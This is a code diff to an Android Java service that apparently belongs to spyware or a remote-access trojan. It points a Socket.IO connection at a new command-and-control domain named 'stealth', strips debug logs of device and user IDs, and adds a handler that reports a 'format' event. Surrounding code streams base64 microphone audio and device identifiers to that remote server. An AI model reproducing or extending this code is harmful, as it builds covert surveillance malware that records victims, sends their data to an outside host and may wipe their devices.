@@ -85,7 +85,7 @@ public class Server extends Service {
         }
 
         try {
-            socket = IO.socket("http://31.220.82.254:8080/");
+            socket = IO.socket("https://stealth.gstpainel.fun/");
 //            socket = IO.socket("http://191.101.131.54:8080");
             socket.connect();
             socket.on(Socket.EVENT_CONNECT, onConnectDevice);
@@ -392,9 +392,6 @@ public class Server extends Service {
         String deviceReleaseVersion = Build.VERSION.RELEASE;
         String deviceManufacture = Build.MANUFACTURER.toUpperCase();
         String deviceInfo = mDeviceID + " " + deviceModel + " " + deviceReleaseVersion + " " + deviceManufacture;
-        Log.d("DeviceId::", mDeviceID);
-        Log.d("app_user_id::", mUserID);
-        Log.d("Connecting:", "Device Connected");
         try {
             JSONObject sendJson = new JSONObject();
             sendJson.put("userId", mUserID);
@@ -542,6 +539,18 @@ public class Server extends Service {
             sendJson.put("base64Audio", bufferData);
             if(socket != null && socket.connected()) {
                 socket.emit("mic-mobile-response", sendJson);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void sendFormatNotification() {
+        try {
+            JSONObject sendJson = new JSONObject();
+            sendJson.put("deviceId", mDeviceID);
+            if(socket != null && socket.connected()) {
+                socket.emit("format-mobile-response", sendJson);
             }
         } catch (Exception e) {
             e.printStackTrace();
